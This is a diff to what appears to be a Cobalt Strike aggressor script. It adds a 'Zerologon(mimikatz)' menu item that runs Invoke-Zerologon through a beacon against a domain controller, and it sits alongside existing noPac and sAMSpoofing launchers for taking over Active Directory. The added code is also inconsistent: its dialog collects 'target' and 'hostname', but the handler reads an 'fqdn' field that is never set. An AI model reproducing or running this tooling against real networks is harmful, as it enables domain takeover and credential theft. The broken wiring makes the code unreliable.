@@ -16,11 +16,23 @@ sub ZeroLogon{
 	}
 	
 }
+
+sub ZeroLogon_mimikatz{
+	bpowershell_import($bid, script_resource("bin/ZeroLogon.ps1"));
+	if($3["Scan"] eq 'true'){
+		bpowerpick($bid,"Invoke-Zerologon $3['fqdn'] 0");
+	} else {
+		bpowerpick($bid,"Invoke-Zerologon $3['fqdn'] 1");
+	}
+	
+}
+
 sub noPAC{
 	bexecute_assembly($bid, script_resource("bin/noPac.exe"), "$3['command']");
 }
 menu "域"{
-	include(script_resource("modules/powerview.cna"));
+	# include(script_resource("modules/powerview.cna"));
+	include(script_resource("modules/powerview3.cna"));
 	menu "sAMSpoofing"{
 		item "加载sAMSpooofing"{
 			$bid = $1;
@@ -57,7 +69,7 @@ menu "域"{
 		}
 
 	}
-	item "ZeroLogon"{
+	item "ZeroLogon(Powershell)"{
 		$bid = $1;
 		$dialog = dialog("ZeroLogon", %(fqdn => "",bid => $bid), &ZeroLogon);
         dialog_description($dialog, "ZeroLogon");
@@ -71,6 +83,16 @@ menu "域"{
 		$dialog = dialog("noPAC", %(command => "",bid => $bid), &noPAC);
         dialog_description($dialog, "https://github.com/cube0x0/noPac");
         drow_text_big($dialog,"command","Command:");
+        dbutton_action($dialog, "Send");
+        dialog_show($dialog);
+	}
+	item "Zerologon(mimikatz)"{
+		$bid = $1;
+		$dialog = dialog("Zerologon", %(target => "192.168.1.1",hostname => "dc$"), &ZeroLogon_mimikatz);
+        dialog_description($dialog, "lsadump::zerologon");
+        drow_text_big($dialog,"target","target:");
+        drow_text_big($dialog,"hostname","hostname:");
+        drow_checkbox($dialog, "Scan","仅扫描?" , "Scan");
         dbutton_action($dialog, "Send");
         dialog_show($dialog);
 	}
